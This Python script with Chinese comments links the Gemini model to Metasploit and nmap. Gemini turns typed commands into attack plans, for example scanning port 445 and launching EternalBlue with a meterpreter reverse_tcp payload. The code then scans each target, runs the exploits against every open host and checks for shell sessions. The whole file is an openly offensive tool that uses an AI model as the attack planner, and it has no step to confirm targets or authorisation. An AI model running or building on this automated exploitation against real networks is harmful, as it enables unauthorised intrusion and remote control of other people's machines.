import os
import time
import json
import nmap
import google.generativeai as genai
from pymetasploit3.msfrpc import MsfRpcClient

class GeminiPlanner:
    """使用Gemini Pro免费模型进行任务规划"""
    def __init__(self):
        # 配置Gemini（需先安装google-generativeai库）
        genai.configure(api_key="")  # 空字符串表示使用CLI模式
        self.model = genai.GenerativeModel('gemini-pro')
    
    def parse_instruction(self, user_command):
        """通过Gemini解析自然语言指令"""
        prompt = f"""作为渗透测试专家，请将以下指令转换为JSON操作序列：
        {{
          "objective": "任务目标",
          "steps": [
            {{"action": "scan", "params": {{"type": "nmap", "target": "网段", "port": "端口"}}}},
            {{"action": "exploit", "params": {{"module": "漏洞模块", "payload": "载荷类型"}}}},
            {{"action": "persist", "params": {{"method": "持久化技术"}}}}
          ]
        }}
        
        示例指令1: "扫描192.168.1.0/24的445端口并利用永恒之蓝漏洞"
        示例输出1: {{
          "objective": "EternalBlue攻击",
          "steps": [
            {{"action": "scan", "params": {{"type": "nmap", "target": "192.168.1.0/24", "port": 445}}},
            {{"action": "exploit", "params": {{"module": "exploit/windows/smb/ms17_010_eternalblue", "payload": "windows/x64/meterpreter/reverse_tcp"}}}}
          ]
        }}
        
        当前指令: {user_command}
        只需输出JSON，不要包含任何解释性文字！"""
        
        response = self.model.generate_content(prompt)
        try:
            # 从Gemini响应中提取纯JSON内容
            json_str = response.text.replace('```json', '').replace('```', '').strip()
            return json.loads(json_str)
        except Exception as e:
            print(f"Gemini解析错误: {e}\n原始响应: {response.text}")
            return None

class MetaOperator:
    """Metasploit操作执行器"""
    def __init__(self, rpc_password):
        self.client = MsfRpcClient(rpc_password, port=55553)
    
    def scan(self, target, port):
        """使用nmap扫描目标"""
        scanner = nmap.PortScanner()
        scanner.scan(hosts=target, ports=str(port))
        return [host for host in scanner.all_hosts() 
                if scanner[host]['tcp'][port]['state'] == 'open']
    
    def exploit(self, module, payload, target, lhost):
        """执行漏洞利用"""
        exploit = self.client.modules.use('exploit', module)
        exploit['RHOSTS'] = target
        exploit['PAYLOAD'] = payload
        exploit['LHOST'] = lhost
        return self.client.execute(exploit)

def main():
    # ===== 初始化配置 =====
    MSFRPC_PASS = "your_rpc_password"  # 需与msfrpcd启动密码一致
    LHOST = "192.168.1.100"           # 监听IP
    
    # ===== 初始化组件 =====
    print("[*] 正在初始化Gemini规划器...")
    planner = GeminiPlanner()
    operator = MetaOperator(MSFRPC_PASS)
    
    # ===== 主循环 =====
    while True:
        try:
            cmd = input("\n[AI-MSF] 输入指令 (或输入quit退出): ").strip()
            if cmd.lower() in ('quit', 'exit'):
                break
                
            # 步骤1: AI生成攻击计划
            print("[*] Gemini正在生成攻击方案...")
            plan = planner.parse_instruction(cmd)
            if not plan:
                print("[-] 计划生成失败，请重新输入指令")
                continue
                
            print(f"[+] 生成计划:\n{json.dumps(plan, indent=2)}")
            
            # 步骤2: 执行扫描
            targets = []
            for step in plan['steps']:
                if step['action'] == 'scan':
                    targets = operator.scan(
                        target=step['params']['target'],
                        port=step['params']['port']
                    )
                    print(f"[+] 发现目标: {', '.join(targets)}")
                    
            # 步骤3: 执行漏洞利用
            for target in targets:
                for step in plan['steps']:
                    if step['action'] == 'exploit':
                        print(f"[*] 正在攻击 {target}...")
                        operator.exploit(
                            module=step['params']['module'],
                            payload=step['params']['payload'],
                            target=target,
                            lhost=LHOST
                        )
                        time.sleep(15)  # 等待攻击完成
                        
                        # 检查会话
                        if operator.client.sessions.list:
                            sid = list(operator.client.sessions.list.keys())[0]
                            print(f"[+] 会话建立成功! SID: {sid}")
                            
        except KeyboardInterrupt:
            print("\n[!] 操作已中止")
            break

if __name__ == "__main__":
    print("="*60)
    print("Gemini-CLI + Metasploit 自动化渗透系统")
    print("="*60)
    print("注意：使用前需要完成以下准备:")
    print("1. 安装Gemini CLI: pip install google-generativeai")
    print("2. 启动msfrpcd: msfrpcd -P your_rpc_password -S -f")
    print("3. 确保本机IP配置正确")
    print("="*60)
    main()